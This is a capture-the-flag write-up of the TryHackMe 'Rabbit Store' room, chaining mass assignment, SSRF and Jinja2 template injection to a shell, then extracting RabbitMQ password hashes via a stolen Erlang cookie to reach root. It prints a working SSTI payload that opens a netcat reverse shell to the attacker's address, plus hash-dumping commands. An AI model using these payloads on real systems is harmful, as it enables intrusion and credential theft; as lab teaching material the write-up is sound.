---
title: "TryHackMe: Rabbit Store"
author: NeoVirex
categories: [TryHackMe]
tags: [RabbitMQ, CTF, Mass Assignment, SSRF, SSTI, RCE, Shell Access, API Exploitation, Web Exploitation, Vulnerability Exploitation, Remote Code Execution, Cybersecurity, Penetration Testing, Erlang Cookie, Root Access, Bug Hunting, Capture the Flag, Server-Side Request Forgery, Server-Side Template Injection, Account Takeover]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_rabbit_store/
image:
  path: room_img.png
description: "I started the Rabbit Store challenge by taking advantage of a mass assignment vulnerability to create an already activated account. This gave us access to an API endpoint that was vulnerable to Server-Side Request Forgery (SSRF). Using the SSRF, we found the API documentation, which led us to another endpoint with a Server Side Template Injection (SSTI) vulnerability. I exploited that to get Remote Code Execution (RCE) and opened a shell on the server."
---
# Rabbit Store

Created: May 30, 2025 3:26 AM
Status: In progress

## Reconnaissance

### rustscan

```jsx
└─$ rustscan -a 10.10.90.8 --ulimit 5000 -- -A

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
With RustScan, I scan ports so fast, even my firewall gets whiplash 💨

[~] The config file is expected to be at "/home/neo/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.90.8:22
Open 10.10.90.8:80
Open 10.10.90.8:4369
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -A" on ip 10.10.90.8
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-30 03:10 EDT
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBXuyWp8m+y9taS8DGHe95YNOsKZ1/LCOjNlkzNjrnqGS1sZuQV7XQT9WbK/yWAgxZNtBHdnUT6uSEZPbfEUjUw=
|   256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILcGp6ztslpYtKYBl8IrBPBbvf3doadnd5CBsO+HFg5M
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp open  epmd    syn-ack ttl 63 Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
TCP/IP fingerprint:
...
: 0.549 days (since Thu May 29 14:00:00 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   141.15 ms 10.9.0.1
2   134.43 ms rabbit.thm (10.10.90.8)
```

### nmap

```jsx
 nmap -sC -sV -p22,80,4369,25672 10.10.249.216
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-15 03:39 EDT
Stats: 0:02:21 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 75.00% done; ETC: 03:42 (0:00:47 remaining)
Nmap scan report for robo.thm (10.10.249.216)
Host is up (0.52s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://cloudsite.thm/
4369/tcp  open  epmd    Erlang Port Mapper Daemon
| epmd-info: 
|   epmd_port: 4369
|   nodes: 
|_    rabbit: 25672
25672/tcp open  unknown
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 173.26 seconds

```

### Initial port scanning with rustscan and nmap revealed the following open ports:

- 22/tcp – OpenSSH 8.9p1
- 80/tcp – Apache HTTPD 2.4.52
- 4369/tcp – Erlang Port Mapper Daemon
- 25672/tcp – RabbitMQ cluster communication port

### The website redirected to [http://cloudsite.thm/](http://cloudsite.thm/), which was added to our /etc/hosts file for easier access.

Using ffuf, we discovered hidden directories like /api, /api/docs, /api/uploads, and /dashboard.

![Screenshot From 2025-05-30 03-25-53.png](img1.png)

## Service Enumeration

![Screenshot From 2025-05-30 03-48-42.png](img2.png)

to access the login page you need to add to host 

try to add the login dns in host file and you will accesses the login page 

![Screenshot From 2025-05-30 03-48-59.png](img3.png)

when we regestir

![Screenshot From 2025-05-30 03-43-28.png](img4.png)

## Web Application Analysis

e registered a new user account, but it remained inactive by default. Examining the JWT token in responses, we noticed a `subscription` field.

![Screenshot From 2025-05-30 03-43-44.png](img5.png)

### The response endpoint includes a `JWT`  try to decode it and understand it,

![Screenshot From 2025-05-30 03-54-17.png](img6.png)

### We found their is a api directory

![Screenshot From 2025-05-30 03-44-05.png](img7.png)

```jsx
└─$ ffuf -u 'http://storage.cloudsite.thm/api/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -mc all -t 100 -ic -fc 404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://storage.cloudsite.thm/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response status: 404
________________________________________________

login                   [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 186ms]
register                [Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 186ms]
uploads                 [Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 153ms]
docs                    [Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 145ms]

```

Try to download the /docs  file 

```jsx
$ curl -s 'http://storage.cloudsite.thm/api/docs'
{"message":"Access denied"}
```

### User Activating

By modifying the registration request to include:

```
"subscription": "active"
```

![Screenshot From 2025-05-30 14-25-36.png](img8.png)

we successfully created an **activated** account, gaining access to protected API endpoints.

### login in with this info and it will show you that upload

![Screenshot From 2025-05-30 14-28-08.png](img9.png)

 Try to upload a file using URL, I create a file 

```jsx
echo "test " > test.txt
```

```jsx
{"url":"http://192.168.1.9/test.txt"}
```

![Screenshot From 2025-05-30 14-31-06.png](img10.png)

It change the file name and save it. when i navigate to this link i can download it. 

So i try to upload and download this file 

```jsx
{"url":"http://storage.cloudsite.thm/api/docs"}
```

It don’t work, to upload the file you need to be in local network or have access so use like.

Use the default IP and port 

```jsx
{"url":"http://127.0.0.1:3000/api/docs"}
```

![Screenshot From 2025-05-30 14-42-49.png](img11.png)

This URL work opening the link download the file 

![Screenshot From 2025-05-30 14-50-39.png](img12.png)

```jsx
http://storage.cloudsite.thm/api/uploads/c340613a-4af4-4779-9521-9f544da96733
```

doc file shows the new directory a chatbot

```jsx
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

Check out the **chatbot** using burp  change the POST and URL to /api/fetch_messeges_from_chatbot \   and  username 

![Screenshot From 2025-05-30 14-42-49.png](img13.png)

```jsx
POST /api/fetch_messeges_from_chatbot

{
  "username":"admin"
}
```

![Screenshot From 2025-05-31 01-37-31.png](img14.png)

```jsx
┌──(neo㉿neo)-[~]
└─$ curl -X POST http://storage.cloudsite.thm/api/fetch_messeges_from_chatbot \
  -H "Content-Type: application/json" \
  -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6Im1lb0B0aG0uYyIsInN1YnNjcmlwdGlvbiI6ImFjdGl2ZSIsImlhdCI6MTc0ODYyNjEwNCwiZXhwIjoxNzQ4NjI5NzA0fQ.k9VOlXafH6k8ue3cAFcyWvgKwHfUWrWHpNgl6iEPIMI" \
  -d '{"username":"admin"}'

<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, admin, our chatbot server is currently under development.</h1>
 </body>
</html>                                                                                   

```

## Exploit & Initial Access

### 💥 Let's Try a Polygot SSTI Payload

You mentioned using a **polyglot payload** like:

```
${{<%[%'"}}%\.
```

This is a *fuzzing payload* designed to **trigger different template engines** (like Jinja2, Twig, ERB, etc.).

![Screenshot From 2025-05-31 01-38-33.png](img15.png)

This causes an error on the **Jinja2** templating

![Screenshot From 2025-05-31 01-39-07.png](img16.png)

### This payload is a **Jinja2 SSTI (Server-Side Template Injection)** used to achieve **Remote Code Execution (RCE)** by initiating a reverse shell. Here's a breakdown and how you can use it properly and safely during a CTF or lab:

```jsx
"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.0.99 443 >/tmp/f').read() }}"
```

This payload:

- Uses Jinja2's `self.__init__.__globals__` to access Python’s `__builtins__`.
- Imports the `os` module dynamically.
- Executes a command to create a reverse shell using **Netcat**.

![Screenshot From 2025-05-31 01-43-51.png](img17.png)

### start the listener

```jsx
─$ nc -lvnp 443                          
listening on [any] 443 ...
connect to [10.9.0.99] from (UNKNOWN) [10.10.220.82] 59334
bash: cannot set terminal process group (604): Inappropriate ioctl for device
bash: no job control in this shell
azrael@forge:~/chatbotServer$ ls
ls
chatbot.py
__pycache__
templates
azrael@forge:~/chatbotServer$
```

### User flag

```jsx
azrael@forge:~/chatbotServer$ ls
ls
chatbot.py
__pycache__
templates
azrael@forge:~/chatbotServer$ cd ..
cd ..
azrael@forge:~$ ls
ls
chatbotServer
snap
user.txt
azrael@forge:~$ cat user.txt
cat user.txt
98d3a30f[REDACTED]44d317be0c47e
azrael@forge:~$ 

```

## Lateral Movement

### **Enumerating the file and the directory**

```jsx
azrael@forge:~/chatbotServer$ cat chatbot.py
cat chatbot.py
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

@app.route('/', methods=['POST'])
def index():
    data = request.get_json()
    if not data or 'username' not in data:
        return jsonify({"error": "username parameter is required"}), 400
    
    username = data['username']
    template = '''<!DOCTYPE html>
<html lang="en">
 <head>
   <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>Greeting</title>
 </head>
 <body>
   <h1>Sorry, {}, our chatbot server is currently under development.</h1>
 </body>
</html>'''.format(username)
    
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, port=8000)
azrael@forge:~/chatbotServer$ 
```

```jsx
azrael@forge:~/chatbotServer$ cat /etc/passwd                                                  
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
azrael:x:1000:1000:KLI:/home/azrael:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
rtkit:x:114:118:RealtimeKit,,,:/proc:/usr/sbin/nologin
epmd:x:115:119::/var/run/epmd:/usr/sbin/nologin
geoclue:x:117:122::/var/lib/geoclue:/usr/sbin/nologin
avahi:x:118:124:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:119:125:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
saned:x:120:126::/var/lib/saned:/usr/sbin/nologin
colord:x:121:127:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
gdm:x:123:130:Gnome Display Manager:/var/lib/gdm3:/bin/false
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
azrael@forge:~/chatbotServer$ 
```

```jsx
rabbitmq:x:124:131:RabbitMQ messaging server,,,:/var/lib/rabbitmq:/usr/sbin/nologin
azrael@forge:~/chatbotServer$ 

azrael@forge:~/chatbotServer$ 
azrael@forge:~/chatbotServer$ cd /var/lib/rabbitmq/
cd /var/lib/rabbitmq/
azrael@forge:/var/lib/rabbitmq$ ls
ls
config
erl_crash.dump
mnesia
nc
schema
azrael@forge:/var/lib/rabbitmq$ ls -la
ls -la
total 896
drwxr-xr-x  5 rabbitmq rabbitmq   4096 Sep 12  2024 .
drwxr-xr-x 45 root     root       4096 Sep 20  2024 ..
drwxr-x---  3 rabbitmq rabbitmq   4096 Aug 15  2024 config
-r-----r--  1 rabbitmq rabbitmq     16 May 31 05:18 .erlang.cookie
-rw-r-----  1 rabbitmq rabbitmq 889463 May 31 05:18 erl_crash.dump
drwxr-x---  4 rabbitmq rabbitmq   4096 May 31 05:18 mnesia
-rw-r-----  1 rabbitmq rabbitmq      0 Sep 12  2024 nc
drwxr-x---  2 rabbitmq rabbitmq   4096 Jul 18  2024 schema
azrael@forge:/var/lib/rabbitmq$ 
```

Cat the .erlang.cookie  file and get the cookie

### is used to interact with a RabbitMQ server node manually using the rabbitmqctl command-line tool. Let me break it down for you:

```jsx
─$ sudo rabbitmqctl --erlang-cookie 'Km6veJxT3aZ0RvJB' --node rabbit@forge status
[sudo] password for neo: 
Status of node rabbit@forge ...
[]
Runtime

OS PID: 1175
OS: Linux
Uptime (seconds): 7306
Is under maintenance?: false
RabbitMQ version: 3.9.13
RabbitMQ release series support status: see https://www.rabbitmq.com/release-information
Node name: rabbit@forge
Erlang configuration: Erlang/OTP 24 [erts-12.2.1] [source] [64-bit] [smp:2:2] [ds:2:2:10] [async-threads:1] [jit]
Crypto library: 
Erlang processes: 382 used, 1048576 limit
Scheduler run queue: 1
Cluster heartbeat timeout (net_ticktime): 60

Plugins

Enabled plugin file: /etc/rabbitmq/enabled_plugins
Enabled plugins:

 * rabbitmq_management
 * amqp_client
 * rabbitmq_web_dispatch
 * cowboy
 * cowlib
 * rabbitmq_management_agent

Data directory

Node data directory: /var/lib/rabbitmq/mnesia/rabbit@forge
Raft data directory: /var/lib/rabbitmq/mnesia/rabbit@forge/quorum/rabbit@forge

Config files

 * /etc/rabbitmq/rabbitmq.conf

Log file(s)

 * /var/log/rabbitmq/rabbit@forge.log
 * /var/log/rabbitmq/rabbit@forge_upgrade.log
 * <stdout>

Alarms

(none)

Tags

(none)

Memory

Total memory used: 0.1349 gb
Calculation strategy: rss
Memory high watermark setting: 0.4 of available memory, computed to: 1.6207 gb

reserved_unallocated: 0.0785 gb (58.19 %)
code: 0.0353 gb (26.2 %)
other_proc: 0.0195 gb (14.43 %)
other_system: 0.0133 gb (9.85 %)
binary: 0.0053 gb (3.96 %)
other_ets: 0.0034 gb (2.5 %)
plugins: 0.0019 gb (1.37 %)
atom: 0.0014 gb (1.06 %)
mgmt_db: 0.0005 gb (0.36 %)
connection_other: 0.0003 gb (0.24 %)
metrics: 0.0002 gb (0.18 %)
mnesia: 0.0001 gb (0.07 %)
connection_readers: 0.0001 gb (0.04 %)
quorum_ets: 0.0 gb (0.02 %)
msg_index: 0.0 gb (0.02 %)
queue_procs: 0.0 gb (0.02 %)
connection_channels: 0.0 gb (0.01 %)
connection_writers: 0.0 gb (0.0 %)
stream_queue_procs: 0.0 gb (0.0 %)
stream_queue_replica_reader_procs: 0.0 gb (0.0 %)
queue_slave_procs: 0.0 gb (0.0 %)
quorum_queue_procs: 0.0 gb (0.0 %)
stream_queue_coordinator_procs: 0.0 gb (0.0 %)
allocated_unused: 0.0 gb (0.0 %)

File Descriptors

Total: 4, limit: 65439

Free Disk Space

Low free disk space watermark: 0.05 gb
Free disk space: 5.7313 gb

Totals

Connection count: 2
Queue count: 1
Virtual host count: 1

Listeners

Interface: [::], port: 15672, protocol: http, purpose: HTTP API
Interface: [::], port: 25672, protocol: clustering, purpose: inter-node and CLI tool communication
Interface: 127.0.0.1, port: 5672, protocol: amqp, purpose: AMQP 0-9-1 and AMQP 1.0
    
```

### is used to **list all RabbitMQ users** that exist on the specified node. Here's what each part does:

```jsx
                                                                               
┌──(neo㉿neo)-[~]
└─$ sudo rabbitmqctl --erlang-cookie 'Km6veJxT3aZ0RvJB' --node rabbit@forge list_users
Listing users ...
user    tags
The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.    []
root    [administrator]
                                                                                   
┌──(neo㉿neo)-[~]
└─$ sudo rabbitmqctl --erlang-cookie 'Km6veJxT3aZ0RvJB' --node rabbit@forge export_definitions /tmp/definitions.json
Exporting definitions in JSON to a file at "/tmp/definitions.json" ...
Stack trace: 

** (UndefinedFunctionError) function JSON.encode/1 is undefined or private
    (elixir 1.18.1) JSON.encode(%{permissions: [%{"configure" => ".*", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], bindings: [], queues: [%{"arguments" => %{}, "auto_delete" => false, "durable" => true, "name" => "tasks", "type" => :classic, "vhost" => "/"}], parameters: [], policies: [], rabbitmq_version: "3.9.13", exchanges: [], global_parameters: [%{"name" => :cluster_name, "value" => "rabbit@forge"}], rabbit_version: "3.9.13", topic_permissions: [%{"exchange" => "", "read" => ".*", "user" => "root", "vhost" => "/", "write" => ".*"}], users: [%{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password. Please don't attempt to crack SHA-256.", "password_hash" => "vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K", "tags" => []}, %{"hashing_algorithm" => :rabbit_password_hashing_sha256, "limits" => %{}, "name" => "root", "password_hash" => "49e6hSl[REDACTED]+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF", "tags" => ["administrator"]}], vhosts: [%{"limits" => [], "metadata" => %{description: "Default virtual host", tags: []}, "name" => "/"}]})
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:154: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.serialise/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmq/cli/ctl/commands/export_definitions_command.ex:76: RabbitMQ.CLI.Ctl.Commands.ExportDefinitionsCommand.run/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:174: RabbitMQCtl.maybe_run_command/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:142: anonymous fn/5 in RabbitMQCtl.do_exec_parsed_command/5
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:642: RabbitMQCtl.maybe_with_distribution/3
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:107: RabbitMQCtl.exec_command/2
    (rabbitmqctl 4.0.0-dev) lib/rabbitmqctl.ex:41: RabbitMQCtl.main/1

Error:
:undef

          
```

"root", "password_hash" => "49e6hSldHRaiY[REDACTED]Sf/Lx67XEOz9uxhSBHtGU+YBzWF", "tags" => ["administrator"]}

### root hash

```jsx
└─$ echo -n '49e6hSldH[REDACTED]ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF' | base64 -d | xxd -p -c 100
e3d7ba85295d1[REDACTED]7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585
                  
```

### remove the 4 byte

```jsx
e3 d7 ba  85  295d1d16a2[REDACTED]2f1ebb5c43b3f6ec614811ed194f98073585
```

```jsx
└─$ nc -lvnp 443                                                               
listening on [any] 443 ...
connect to [10.9.0.99] from (UNKNOWN) [10.10.112.160] 49678
bash: cannot set terminal process group (604): Inappropriate ioctl for device
bash: no job control in this shell
azrael@forge:~/chatbotServer$ su - root
su - root
Password: 295d1d16a261[REDACTED]27ff2f1ebb5c43b3f6ec614811ed194f98073585

ls
forge_web_service
root.txt
snap
cat root.txt
eabf7a0b05d[REDACTED]465d2fd0852

```
<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
